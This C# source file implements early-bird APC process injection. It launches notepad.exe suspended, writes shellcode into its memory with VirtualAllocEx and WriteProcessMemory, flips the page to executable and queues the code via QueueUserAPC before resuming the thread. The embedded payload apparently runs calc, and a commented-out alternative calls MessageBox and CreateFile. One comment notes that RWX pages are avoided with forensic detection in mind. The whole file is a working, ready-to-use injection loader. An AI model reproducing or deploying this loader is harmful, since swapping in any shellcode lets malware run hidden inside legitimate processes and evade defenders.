using System;
using System.Reflection;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class ApcInjectionNewProcess
{
       public static void Main()
       {      
              byte[] shellcode = new byte[112]{0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3};
			  
			  //byte[] shellcode = new byte[496]{0xE9,0x8B,0x01,0x00,0x00,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x64,0xA1,0x30,0x00,0x00,0x00,0x85,0xC0,0x78,0x0D,0x8B,0x40,0x0C,0x8B,0x40,0x14,0x8B,0x00,0x8B,0x00,0x8B,0x40,0x10,0xC3,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x55,0x8B,0xEC,0x83,0xEC,0x40,0x53,0x56,0x8B,0xD9,0x57,0x89,0x5D,0xF4,0xE8,0xCD,0xFF,0xFF,0xFF,0x8B,0xF0,0x33,0xFF,0x8B,0x56,0x3C,0x39,0x7C,0x32,0x7C,0x75,0x07,0x33,0xFF,0xE9,0x9C,0x00,0x00,0x00,0x8B,0x44,0x32,0x78,0x85,0xC0,0x74,0xF1,0x8B,0x54,0x30,0x18,0x85,0xD2,0x74,0xE9,0x8B,0x4C,0x30,0x24,0x8B,0x5C,0x30,0x20,0x03,0xCE,0x8B,0x44,0x30,0x1C,0x03,0xDE,0x03,0xC6,0x89,0x4D,0xFC,0x33,0xC9,0x89,0x45,0xF8,0x4A,0x8B,0x04,0x8B,0x03,0xC6,0x80,0x38,0x47,0x75,0x4E,0x80,0x78,0x01,0x65,0x75,0x48,0x80,0x78,0x02,0x74,0x75,0x42,0x80,0x78,0x03,0x50,0x75,0x3C,0x80,0x78,0x04,0x72,0x75,0x36,0x80,0x78,0x05,0x6F,0x75,0x30,0x80,0x78,0x06,0x63,0x75,0x2A,0x80,0x78,0x07,0x41,0x75,0x24,0x80,0x78,0x08,0x64,0x75,0x1E,0x80,0x78,0x09,0x64,0x75,0x18,0x80,0x78,0x0A,0x72,0x75,0x12,0x80,0x78,0x0B,0x65,0x75,0x0C,0x80,0x78,0x0C,0x73,0x75,0x06,0x80,0x78,0x0D,0x73,0x74,0x07,0x41,0x3B,0xCA,0x76,0xA3,0xEB,0x0F,0x8B,0x45,0xFC,0x8B,0x7D,0xF8,0x0F,0xB7,0x04,0x48,0x8B,0x3C,0x87,0x03,0xFE,0x8B,0x5D,0xF4,0x8D,0x45,0xC0,0x89,0x3B,0x50,0xC7,0x45,0xC0,0x4C,0x6F,0x61,0x64,0xC7,0x45,0xC4,0x4C,0x69,0x62,0x72,0xC7,0x45,0xC8,0x61,0x72,0x79,0x41,0xC6,0x45,0xCC,0x00,0xE8,0xF9,0xFE,0xFF,0xFF,0x50,0x8B,0x03,0xFF,0xD0,0x8D,0x4D,0xDC,0x89,0x43,0x04,0x51,0x8D,0x4D,0xE8,0xC7,0x45,0xE8,0x55,0x73,0x65,0x72,0x51,0xC7,0x45,0xEC,0x33,0x32,0x2E,0x64,0x66,0xC7,0x45,0xF0,0x6C,0x6C,0xC6,0x45,0xF2,0x00,0xC7,0x45,0xDC,0x4D,0x65,0x73,0x73,0xC7,0x45,0xE0,0x61,0x67,0x65,0x42,0xC7,0x45,0xE4,0x6F,0x78,0x41,0x00,0xFF,0xD0,0x50,0x8B,0x03,0xFF,0xD0,0x89,0x43,0x08,0x8D,0x45,0xD0,0x50,0xC7,0x45,0xD0,0x43,0x72,0x65,0x61,0xC7,0x45,0xD4,0x74,0x65,0x46,0x69,0xC7,0x45,0xD8,0x6C,0x65,0x41,0x00,0xE8,0x94,0xFE,0xFF,0xFF,0x50,0x8B,0x03,0xFF,0xD0,0x5F,0x5E,0x89,0x43,0x0C,0x5B,0x8B,0xE5,0x5D,0xC3,0xCC,0xCC,0xCC,0xCC,0xCC,0x55,0x8B,0xEC,0x83,0xEC,0x24,0x8D,0x4D,0xDC,0xE8,0x92,0xFE,0xFF,0xFF,0x6A,0x00,0x8D,0x45,0xFC,0xC7,0x45,0xEC,0x48,0x65,0x6C,0x6C,0x50,0x8D,0x45,0xEC,0x66,0xC7,0x45,0xF0,0x6F,0x21,0x50,0x6A,0x00,0xC6,0x45,0xF2,0x00,0xC7,0x45,0xFC,0x54,0x69,0x70,0x00,0xFF,0x55,0xE4,0x6A,0x00,0x6A,0x00,0x6A,0x02,0x6A,0x00,0x6A,0x00,0x68,0x00,0x00,0x00,0x40,0x8D,0x45,0xF4,0xC7,0x45,0xF4,0x31,0x2E,0x74,0x78,0x50,0x66,0xC7,0x45,0xF8,0x74,0x00,0xFF,0x55,0xE8,0x8B,0xE5,0x5D,0xC3,0xCC,0xCC,0xCC,0xCC};
              
              // Target process to inject into
              string processpath = @"C:\Windows\notepad.exe";
              STARTUPINFO si = new STARTUPINFO();
              PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
              
              // Create new process in suspended state to inject into
              bool success = CreateProcess(processpath, null,
                     IntPtr.Zero, IntPtr.Zero, false,
                     ProcessCreationFlags.CREATE_SUSPENDED,
                     IntPtr.Zero, null, ref si, out pi);
              
              // Allocate memory within process and write shellcode
              IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,MEM_COMMIT, PAGE_READWRITE);
              IntPtr bytesWritten = IntPtr.Zero;
              bool resultBool = WriteProcessMemory(pi.hProcess,resultPtr,shellcode,shellcode.Length, out bytesWritten);
              
              // Open thread
              IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
              uint oldProtect = 0;
              
              // Modify memory permissions on allocated shellcode
              resultBool = VirtualProtectEx(pi.hProcess,resultPtr, shellcode.Length,PAGE_EXECUTE_READ, out oldProtect);
              
              // Assign address of shellcode to the target thread apc queue
              IntPtr ptr = QueueUserAPC(resultPtr,sht,IntPtr.Zero);
              
              IntPtr ThreadHandle = pi.hThread;
              ResumeThread(ThreadHandle);
              
       }
       
       
       private static UInt32 MEM_COMMIT = 0x1000;
 
       private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR
       private static UInt32 PAGE_READWRITE = 0x04;
       private static UInt32 PAGE_EXECUTE_READ = 0x20;
       
       
       [Flags]
       public enum ProcessAccessFlags : uint
       {
              All = 0x001F0FFF,
              Terminate = 0x00000001,
              CreateThread = 0x00000002,
              VirtualMemoryOperation = 0x00000008,
              VirtualMemoryRead = 0x00000010,
              VirtualMemoryWrite = 0x00000020,
              DuplicateHandle = 0x00000040,
              CreateProcess = 0x000000080,
              SetQuota = 0x00000100,
              SetInformation = 0x00000200,
              QueryInformation = 0x00000400,
              QueryLimitedInformation = 0x00001000,
              Synchronize = 0x00100000
       }
       
       [Flags]
       public enum ProcessCreationFlags : uint
       {
              ZERO_FLAG = 0x00000000,
              CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
              CREATE_DEFAULT_ERROR_MODE = 0x04000000,
              CREATE_NEW_CONSOLE = 0x00000010,
              CREATE_NEW_PROCESS_GROUP = 0x00000200,
              CREATE_NO_WINDOW = 0x08000000,
              CREATE_PROTECTED_PROCESS = 0x00040000,
              CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
              CREATE_SEPARATE_WOW_VDM = 0x00001000,
              CREATE_SHARED_WOW_VDM = 0x00001000,
              CREATE_SUSPENDED = 0x00000004,
              CREATE_UNICODE_ENVIRONMENT = 0x00000400,
              DEBUG_ONLY_THIS_PROCESS = 0x00000002,
              DEBUG_PROCESS = 0x00000001,
              DETACHED_PROCESS = 0x00000008,
              EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
              INHERIT_PARENT_AFFINITY = 0x00010000
       }
       public struct PROCESS_INFORMATION
       {
              public IntPtr hProcess;
              public IntPtr hThread;
              public uint dwProcessId;
              public uint dwThreadId;
       }
       public struct STARTUPINFO
       {
              public uint cb;
              public string lpReserved;
              public string lpDesktop;
              public string lpTitle;
              public uint dwX;
              public uint dwY;
              public uint dwXSize;
              public uint dwYSize;
              public uint dwXCountChars;
              public uint dwYCountChars;
              public uint dwFillAttribute;
              public uint dwFlags;
              public short wShowWindow;
              public short cbReserved2;
              public IntPtr lpReserved2;
              public IntPtr hStdInput;
              public IntPtr hStdOutput;
              public IntPtr hStdError;
       }
       
       [Flags]
       public enum    ThreadAccess : int
       {
              TERMINATE           = (0x0001)  ,
              SUSPEND_RESUME      = (0x0002)  ,
              GET_CONTEXT         = (0x0008)  ,
              SET_CONTEXT         = (0x0010)  ,
              SET_INFORMATION     = (0x0020)  ,
              QUERY_INFORMATION       = (0x0040)  ,
              SET_THREAD_TOKEN    = (0x0080)  ,
              IMPERSONATE         = (0x0100)  ,
              DIRECT_IMPERSONATION    = (0x0200)
       }
       
       [DllImport("kernel32.dll", SetLastError = true)]
       public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
              int dwThreadId);
       
       [DllImport("kernel32.dll",SetLastError = true)]
       public static extern bool WriteProcessMemory(
              IntPtr hProcess,
              IntPtr lpBaseAddress,
              byte[] lpBuffer,
              int nSize,
              out IntPtr lpNumberOfBytesWritten);
       
       [DllImport("kernel32.dll")]
       public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
       
       [DllImport("kernel32")]
       public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
               Int32 size, UInt32 flAllocationType, UInt32 flProtect);
       [DllImport("kernel32.dll", SetLastError = true )]
       public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
       Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
       
       [DllImport("kernel32.dll", SetLastError = true)]
       public static extern IntPtr OpenProcess(
        ProcessAccessFlags processAccess,
        bool bInheritHandle,
        int processId
       );
       
       
       [DllImport("kernel32.dll")]
       public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment,string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
       [DllImport("kernel32.dll")]
       public static extern uint ResumeThread(IntPtr hThread);
       [DllImport("kernel32.dll")]
       public static extern uint SuspendThread(IntPtr hThread);
       [DllImport("kernel32.dll")]
       public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
       int dwSize, uint flNewProtect, out uint lpflOldProtect);
}